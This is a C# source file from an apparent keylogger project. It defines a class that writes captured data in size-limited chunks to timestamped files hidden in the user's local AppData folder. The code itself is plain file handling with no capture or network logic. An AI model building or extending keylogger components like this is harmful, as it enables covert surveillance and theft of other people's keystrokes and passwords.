using KeyLoggerConfig;
using System;
using System.IO;
using System.Text;

namespace KeyLogger
{
    public class AppDataLogger : IDisposable
    {
        public AppDataLogger(int maximumChunkSize)
        {
            MaximumChunkSize = maximumChunkSize;
            NewChunk();
        }

        private FileStream _activeFileStream;
        public int CurrentChunkSize { get; private set; }
        public int MaximumChunkSize { get; }

        public void Write(string data)
        {
            var dataAsBytes = Encoding.UTF8.GetBytes(data);
            _activeFileStream.Write(dataAsBytes, 0, dataAsBytes.Length);
            _activeFileStream.Flush();

            CurrentChunkSize += dataAsBytes.Length;

            if (CurrentChunkSize > MaximumChunkSize)
            {
                NewChunk();
            }
        }

        private void NewChunk()
        {
            _activeFileStream?.Dispose();
            _activeFileStream = new FileStream(GetFilename(), FileMode.Append);
            CurrentChunkSize = 0;
        }

        private string GetFilename()
        {
            string date = DateTime.Now.ToString("dd.MM.yyyyTHH.mm");

            var appDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData, Environment.SpecialFolderOption.Create);

            string logsFolder = Path.Combine(appDataFolder, Config.AppDataSubfolder);

            Directory.CreateDirectory(logsFolder);

            string filename = Config.FilenameTemplate
                .Replace("{date}", date)
                .Replace("{guid}", Guid.NewGuid().ToString());

            return Path.Combine(logsFolder, filename);
        }

        public void Dispose()
        {
            _activeFileStream?.Dispose();
        }
    }
}
